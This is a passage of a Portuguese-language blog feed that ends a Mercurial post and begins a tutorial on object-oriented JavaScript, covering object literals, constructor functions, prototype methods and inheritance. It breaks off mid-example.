&lt;li&gt;&lt;a href="http://tocadoelfo.blogspot.com/2011/03/mercurial-hg-controlando-as-versoes-do.html" title="Excelente post sobre Mercurial, TI e gerência de projetos"&gt;&lt;em&gt;Mercurial Hg&lt;/em&gt; – Controlando as Versões do seu &lt;em&gt;Software&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hgbook.red-bean.com/read/" title="Excelente e-book de Bryan O'Sullivan sobre Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;: &lt;em&gt;The Definitive Guide&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt;, vamos concluir a trilogia mostrando uma forma bacana
de utilizar o &lt;em&gt;Mercurial&lt;/em&gt; para versionar seus projetos &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="mercurial"></category></entry><entry><title>Fazendo Javascript OO de forma fácil</title><link href="https://klauslaube.com.br/2011/05/16/fazendo-javascript-oo-de-forma-facil.html" rel="alternate"></link><published>2011-05-16T22:27:00-03:00</published><updated>2011-05-16T22:27:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-05-16:/2011/05/16/fazendo-javascript-oo-de-forma-facil.html</id><summary type="html">&lt;p&gt;Embora o &lt;em&gt;Javascript&lt;/em&gt; (em sua essência) seja orientado a objetos, temos
que admitir que ela foge um pouco do convencional através do estilo de
escrita &lt;em&gt;&lt;em&gt;prototype&lt;/em&gt;&lt;/em&gt;. Quero dizer que, é possível utilizarmos
conceitos como encapsulamento, herança, atributos e métodos públicos e
privados, etc. Mas de uma maneira um pouco diferente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Embora o &lt;em&gt;Javascript&lt;/em&gt; (em sua essência) seja orientado a objetos, temos
que admitir que ela foge um pouco do convencional através do estilo de
escrita &lt;em&gt;&lt;em&gt;prototype&lt;/em&gt;&lt;/em&gt;. Quero dizer que, é possível utilizarmos
conceitos como encapsulamento, herança, atributos e métodos públicos e
privados, etc. Mas de uma maneira um pouco diferente se comparada a
linguagens como &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; ou &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Encapsular para conquistar!&lt;/h2&gt;
&lt;p&gt;A linguagem é composta por alguns objetos muito utilizados no cotidiano,
como os objetos &lt;code&gt;Array&lt;/code&gt;, &lt;code&gt;Math&lt;/code&gt; e &lt;code&gt;String&lt;/code&gt;. Estes (e outros
&lt;a href="https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects" title="Veja outros objetos globais da linguagem"&gt;objetos de &lt;em&gt;core&lt;/em&gt;&lt;/a&gt;) são instâncias do objeto &lt;code&gt;Object&lt;/code&gt;, que você
pode representar através da seguinte expressão:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;meuObjeto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;meuObjeto&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// object&lt;/span&gt;
&lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;      &lt;span class="c1"&gt;// object&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Você encontrará uma forma (muito bacana por sinal) de construir objetos
através de expressões como essas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;fooBar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Posso funcionar como um inicializador!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;_private&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;tipo&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Testando chamada &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;tipo&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;eggs&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Eggs.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;fooBar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_private&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;interna&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;spam&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Spam: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nx"&gt;fooBar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  &lt;span class="c1"&gt;// Posso funcionar como um inicializador!&lt;/span&gt;
&lt;span class="nx"&gt;fooBar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;eggs&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  &lt;span class="c1"&gt;// Eggs.&lt;/span&gt;

&lt;span class="c1"&gt;// Testando chamada interna&lt;/span&gt;
&lt;span class="nx"&gt;fooBar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_private&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;externa&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Testando chamada externa&lt;/span&gt;
&lt;span class="nx"&gt;fooBar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;spam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Eggs and Spam&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// Spam: Eggs and Spam&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pode-se observar que é uma prática válida para organizar código através
de namespaces.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Referência:&lt;/strong&gt; &lt;a href="http://blog.rebeccamurphey.com/2009/10/15/using-objects-to-organize-your-code/" title="Um bom artigo da Rebecca Murphey sobre como organizar seus scripts através de Objects"&gt;&lt;em&gt;Using Objects to organize your code&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Função ou Classe?&lt;/h2&gt;
&lt;p&gt;Já utilizei algumas vezes o modelo acima… mas devo dizer que sou adepto
a uma outra forma de construirmos classes em &lt;em&gt;Javascript&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Pessoa instanciada!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nx"&gt;Pessoa&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  &lt;span class="c1"&gt;// Pessoa instanciada!&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Pessoa&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;   &lt;span class="c1"&gt;// function&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;pessoa1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;    &lt;span class="c1"&gt;// Pessoa instanciada!&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;pessoa1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;  &lt;span class="c1"&gt;// object&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No exemplo acima, podemos reparar que seguindo o comportamento normal de
uma função, não há surpresas na execução da expressão &lt;code&gt;Pessoa&lt;/code&gt;. Porém,
quando adicionamos o operador &lt;code&gt;new&lt;/code&gt; na frente, o &lt;em&gt;Javascript&lt;/em&gt; cria uma
instância do tipo &lt;code&gt;Pessoa&lt;/code&gt;. Basicamente é como se a expressão
&lt;code&gt;function&lt;/code&gt; fosse “multiuso”, sendo útil para definir funções e
classes.&lt;/p&gt;
&lt;p&gt;O mais legal disso é que, como você já deve ter reparado, com o uso do
&lt;code&gt;new&lt;/code&gt; ganhamos de graça um &lt;code&gt;constructor&lt;/code&gt; (ou inicializador, como
preferir) em nossa classe &lt;code&gt;Pessoa&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Referência:&lt;/strong&gt; &lt;a href="https://developer.mozilla.org/en/Introduction_to_Object-Oriented_JavaScript" title="Excelente artigo da Mozilla ensinando a como representar estados da Orientação a Objetos com Javascript"&gt;&lt;em&gt;Introduction to Object-Oriented Javascript&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Métodos, propriedades e um pouco de confusão&lt;/h2&gt;
&lt;p&gt;Do construtor em diante, já me deparei com algumas vertentes de
implementações do &lt;em&gt;Javascript&lt;/em&gt;. Já encontrei algumas &lt;a href="http://jquery-howto.blogspot.com/2009/01/object-oriented-javascript-how-to_21.html" title="Object-Oriented JavaScript, how to achieve public properties/fields"&gt;bem simples&lt;/a&gt;,
outras &lt;a href="http://www.coolpage.com/developer/javascript/Correct%20OOP%20for%20Javascript.html" title="Correct OOP for Javascript"&gt;um pouco mais complicadas&lt;/a&gt; … vou mostrar aqui a que eu
acredito ser a mais usual. Não tenho propriedade para dizer se é o modo
certo ou mais elegante, apenas é o modo que incorpora características de
&lt;em&gt;OOP&lt;/em&gt; que melhor me atendeu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;versao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acima temos a construção da classe &lt;code&gt;Linguagem&lt;/code&gt;. Em seu constructor
aproveitamos para setar alguns atributos, como &lt;code&gt;nome&lt;/code&gt; e &lt;code&gt;versao&lt;/code&gt;, que são
passados imediatamente na hora de instanciá-la.&lt;/p&gt;
&lt;p&gt;Para criar um método para esta classe, vamos recorrer ao &lt;em&gt;prototype&lt;/em&gt; do
&lt;em&gt;Javascript&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;descricaoCompleta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; vr. &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Resumidamente, estamos adicionando um método de instância na estrutura
da classe. Fazemos isso adicionando uma função ao &lt;code&gt;prototype&lt;/code&gt; da classe.
Dessa forma o método terá acesso as propriedades do objeto na hora que
for instanciado.&lt;/p&gt;
&lt;p&gt;Se tentarmos executar a expressão &lt;code&gt;Linguagem.descricaoCompleta&lt;/code&gt;,
iremos nos deparar com um erro de método inexistente. Mas, se
instanciarmos a classe veremos que o método está acessível:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;python&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Python&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2.7&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;python&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                      &lt;span class="c1"&gt;// Linguagem&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;python&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;descricaoCompleta&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;  &lt;span class="c1"&gt;// Python vr.2.7&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acima utilizamos o conceito de métodos e atributos de instância. Através
do modelo &lt;em&gt;object literal&lt;/em&gt; podemos ter um comportamento parecido com o
conceito de métodos de classe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;versao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;// Chamando um método que está fora do prototype da classe&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;meuId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;incId&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="c1"&gt;// Adicionando uma propriedade através de Object Literal&lt;/span&gt;
&lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// Adicionando um método através de Object Literal&lt;/span&gt;
&lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;incId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;javascript&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Javascript&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;        &lt;span class="c1"&gt;// Linguagem&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;meuId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta forma de criar classes e objetos em &lt;em&gt;Javascript&lt;/em&gt; é executada com
muito sucesso na biblioteca &lt;a href="http://www.rgraph.net/" title="RGraph: HTML5 canvas graph library based on the HTML5 canvas tag "&gt;&lt;em&gt;RGraph&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Referências:&lt;/strong&gt; &lt;a href="http://weblog.bocoup.com/javascript-is-object-oriented-programming" title="Excelente artigo mostrando os conceitos de OOP aplicados ao Javascript"&gt;&lt;em&gt;Javascript is Object Oriented Programming&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Herdar é preciso&lt;/h2&gt;
&lt;p&gt;Para entender como criar heranças com o &lt;em&gt;prototype&lt;/em&gt; do &lt;em&gt;Javascript&lt;/em&gt;,
vamos primeiramente criar um tipo chamado &lt;code&gt;Framework&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Framework&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nomeFramework&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;versao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;versao&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nomeFramework&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nomeFramework&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No caso acima, iremos sobrescrever o comportamento do &lt;em&gt;constructor&lt;/em&gt; da
classe &lt;code&gt;Linguagem&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;E é aqui que a mágica acontece… instanciamos o tipo &lt;code&gt;Linguagem&lt;/code&gt; no
&lt;code&gt;prototype&lt;/code&gt; da classe &lt;code&gt;Framework&lt;/code&gt;. Isto fará com que o tipo
&lt;code&gt;Framework&lt;/code&gt; possua todas as propriedades de &lt;code&gt;Linguagem&lt;/code&gt;. Depois corrigimos
o &lt;code&gt;constructor&lt;/code&gt;, apontando ele novamente para &lt;code&gt;Framework&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// Cria herança com Linguagem&lt;/span&gt;
&lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Linguagem&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// Corrige o ponteiro do constructor para Framework (está apontando para Linguagem)&lt;/span&gt;
&lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos adicionar um método exclusivo da classe &lt;code&gt;Framework&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;feitoEm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
